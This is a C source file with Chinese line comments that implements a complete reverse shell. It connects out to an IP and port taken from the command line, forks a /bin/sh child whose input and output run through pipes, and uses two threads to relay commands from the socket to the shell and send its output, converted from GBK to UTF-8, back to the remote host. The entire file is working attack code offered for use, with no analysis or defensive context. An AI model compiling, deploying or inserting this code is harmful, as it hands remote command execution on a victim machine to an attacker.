#include <stdio.h>              // 标准输入输出函数，如 printf、perror
#include <stdlib.h>             // 标准库函数，如 atoi、exit、malloc、free
#include <unistd.h>             // Unix 标准函数，如 fork、pipe、dup2、exec
#include <string.h>             // 字符串处理函数，如 memset、strlen
#include <sys/socket.h>         // 套接字函数，如 socket、connect、send、recv
#include <arpa/inet.h>          // 网络地址转换函数，如 inet_addr、htons
#include <pthread.h>            // POSIX 线程库函数，如 pthread_create
#include <netinet/in.h>         // 定义 sockaddr_in 结构体
#include <fcntl.h>              // 文件控制，如 open、O_RDONLY
#include <sys/types.h>          // 系统数据类型定义，如 pid_t
#include <sys/wait.h>           // 等待子进程结束的函数，如 wait
#include <ctype.h>              // 字符判断函数，如 isprint（判断是否可打印字符）
#include "gbk_linux.h"          // 自定义头文件，用于将 GBK 编码转换为 UTF-8

int sock = -1;                  // 全局变量，保存 socket 描述符
int stdin_pipe[2];              // 父进程写入，子进程从这里读（标准输入）
int stdout_pipe[2];             // 子进程写入，父进程从这里读（标准输出）

// 检查字符串是否为合法的 UTF-8 编码
int is_valid_utf8(const char *str) {
    const unsigned char *bytes = (const unsigned char *)str;
    while (*bytes) {
        if (*bytes <= 0x7F) {
            // 单字节 ASCII 字符
            bytes += 1;
        } else if ((bytes[0] & 0xE0) == 0xC0 &&
                   (bytes[1] & 0xC0) == 0x80) {
            // 两字节 UTF-8 编码
            bytes += 2;
        } else if ((bytes[0] & 0xF0) == 0xE0 &&
                   (bytes[1] & 0xC0) == 0x80 &&
                   (bytes[2] & 0xC0) == 0x80) {
            // 三字节 UTF-8 编码
            bytes += 3;
        } else if ((bytes[0] & 0xF8) == 0xF0 &&
                   (bytes[1] & 0xC0) == 0x80 &&
                   (bytes[2] & 0xC0) == 0x80 &&
                   (bytes[3] & 0xC0) == 0x80) {
            // 四字节 UTF-8 编码
            bytes += 4;
        } else {
            // 不是合法的 UTF-8 字节序列
            return 0;
        }
    }
    return 1; // 是合法的 UTF-8
}

// 线程函数：不断从子进程读取输出，并转发到 socket
void* ReadOutputThread(void* arg) {
    char buffer[1024];               // 缓冲区
    ssize_t bytesRead;              // 实际读取到的字节数

    // 循环读取子进程的输出内容
    while ((bytesRead = read(stdout_pipe[0], buffer, sizeof(buffer) - 1)) > 0) {
        buffer[bytesRead] = '\0';   // 确保是以 null 结尾的字符串

        if (is_valid_utf8(buffer)) {
            // 如果是合法 UTF-8，就直接发送
            send(sock, buffer, bytesRead, 0);
        } else {
            // 如果是乱码（如 GBK），尝试转为 UTF-8
            char* utf8_buf = gbk_to_utf8(buffer);
            if (utf8_buf) {
                send(sock, utf8_buf, strlen(utf8_buf), 0); // 发送转码后的内容
                free(utf8_buf); // 释放内存
            } else {
                send(sock, buffer, bytesRead, 0); // 转码失败，发送原始内容
            }
        }
    }
    return NULL;
}

// 线程函数：不断从 socket 接收命令并写入到子进程输入
void* SocketReadThread(void* arg) {
    char buffer[512];              // 缓冲区
    ssize_t bytesRead;

    // 循环接收远程发来的数据
    while ((bytesRead = recv(sock, buffer, sizeof(buffer), 0)) > 0) {
        write(stdin_pipe[1], buffer, bytesRead); // 将接收到的命令写入子进程 stdin
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        // 如果参数个数不正确，打印用法
        printf("Usage: %s <IP> <PORT>\n", argv[0]);
        return 1;
    }

    const char *ip = argv[1];       // 目标 IP
    int port = atoi(argv[2]);       // 目标端口

    // 检查端口合法性
    if (port <= 0 || port > 65535) {
        printf("Invalid port number: %s\n", argv[2]);
        return 1;
    }

    // 创建 TCP socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        perror("Socket creation failed");
        return 1;
    }

    // 设置服务器信息结构体
    struct sockaddr_in server;
    memset(&server, 0, sizeof(server));
    server.sin_family = AF_INET;                 // 使用 IPv4
    server.sin_port = htons(port);               // 端口号（主机字节序 → 网络字节序）
    server.sin_addr.s_addr = inet_addr(ip);      // IP 地址（字符串转为二进制）

    // 尝试连接远程服务器
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == -1) {
        perror("Connect failed");
        close(sock);      // 关闭 socket
        return 1;
    }

    // 创建两个管道：标准输入管道、标准输出管道
    pipe(stdin_pipe);
    pipe(stdout_pipe);

    pid_t pid = fork();  // 创建子进程
    if (pid == 0) {
        // === 子进程逻辑 ===

        dup2(stdin_pipe[0], 0);   // 将标准输入重定向为管道读端
        dup2(stdout_pipe[1], 1);  // 将标准输出重定向为管道写端
        dup2(stdout_pipe[1], 2);  // 将标准错误也重定向为同一个输出管道

        // 关闭无用的管道端口（子进程中）
        close(stdin_pipe[1]);
        close(stdout_pipe[0]);

        // 执行 /bin/sh 启动 shell
        execl("/bin/sh", "sh", NULL);

        // exec 失败则打印错误
        perror("execl failed");
        exit(1);
    } else if (pid > 0) {
        // === 父进程逻辑 ===

        // 父进程中关闭不需要的管道端
        close(stdin_pipe[0]);
        close(stdout_pipe[1]);

        // 创建两个线程：一个读取 shell 输出，一个发送命令
        pthread_t tid1, tid2;
        pthread_create(&tid1, NULL, ReadOutputThread, NULL);
        pthread_create(&tid2, NULL, SocketReadThread, NULL);

        // 等待子进程退出
        wait(NULL);

        // 清理资源
        close(sock);
        close(stdin_pipe[1]);
        close(stdout_pipe[0]);
    } else {
        // fork 失败
        perror("fork failed");
        close(sock);
        return 1;
    }

    return 0;
}
